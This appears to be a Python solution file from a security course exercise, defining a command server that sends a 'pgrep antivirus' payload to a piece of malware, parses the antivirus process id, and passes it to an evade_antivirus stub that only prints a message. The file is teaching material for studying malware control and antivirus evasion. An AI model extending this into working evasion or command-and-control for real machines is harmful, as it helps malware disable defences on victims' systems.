import server


class EvadeAntivirusServer(server.CommandServer):
    """The base class for the servers we will implement"""

    def __init__(self):
        super(EvadeAntivirusServer, self).__init__()
        self.add_payload(
            self.payload_for_getting_antivirus_pid(),
            self.handle_first_payload)

    def payload_for_getting_antivirus_pid(self) -> bytes:
        """This function returns a payload for getting the pid of the antivirus.

        Returns:
             The bytes payload for the malware.
        """
        return 'pgrep antivirus'.encode('latin-1')

    def get_antivirus_pid(self, product: bytes) -> int:
        """This function extracts the pid from the given product.

        This product is the result of invoking the payload returned from
        `payload_for_getting_antivirus_pid`.

        Hint: To convert the `bytes` to `str`, consider using
        `product.decode('latin-1')`

        Returns:
             The pid of the antivirus (as an integer). If the antivirus is not
             found, return -1.
        """
        return -1 if product == b'' else int(product.decode('latin-1').rstrip('\r\n'))

    def handle_first_payload(self, product: bytes):
        pid = int(self.get_antivirus_pid(product))
        if pid != -1:
            print(f'Antivirus process id is: {pid}')
            self.evade_antivirus(pid)
        else:
            print('Antivirus not found')

    def evade_antivirus(self, pid: int):
        # WARNING: Don't modify this function, we will implement it for you in
        #          all the questions.
        print(f'Oh noes! I should escape {pid}')


if __name__ == '__main__':
    EvadeAntivirusServer().run_server(host='0.0.0.0', port=8000)
